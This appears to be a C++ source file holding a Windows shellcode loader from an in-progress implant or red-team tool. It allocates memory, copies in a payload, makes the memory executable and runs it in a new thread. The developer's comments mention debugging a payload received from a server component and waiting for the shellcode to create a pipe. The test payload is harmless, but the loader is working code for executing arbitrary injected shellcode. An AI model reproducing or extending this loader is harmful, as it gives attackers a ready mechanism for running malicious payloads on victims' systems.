#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <iostream>

int injector(std::vector<uint8_t> payload) {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    //this works - so somethings up with the vector access w/ memory
    std::cout << "[?] Using temp payload of \\x90\\x90\\x90\\xC3 cuz the payload is being dumb" << std::endl;
    //const char* payload = "\x90\x90\x90\xC3";
    //unsigned int payload_len = 4;

    //this still runs so it's eitehr 1. payload from TS was received wrong, or 2. vector ownership is screwed up. 
    //Can test #2 by moving payload outsid eof this func
    //theory with 1 is that extra bytes get appended to payload 
    //std::vector<uint8_t> payload = { 0x90,0x90,0x90,0xc3 };
    //it is NOT the passing in the vector, so something is weird with the payload it appears.
    auto payload_len = payload.size();

 /*   unsigned char* payload = payloadVector.data();
    unsigned int payload_len = payloadVector.size();*/

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == nullptr) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return 1;
    }

    RtlMoveMemory(exec_mem, payload.data(), payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv == 0) {
        std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
        return 1;
    }

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (th == nullptr) {
        std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
        return 1;
    }

    //Waiting for 1 second to let the shellcode run and get established (and create the pipe), and then start reading from pipe stuff.
    std::cout << "[!] Waiting one second to let ShellCode do its thing" << std::endl;
    WaitForSingleObject(th, 1000);
    CloseHandle(th);

    return 0;
}

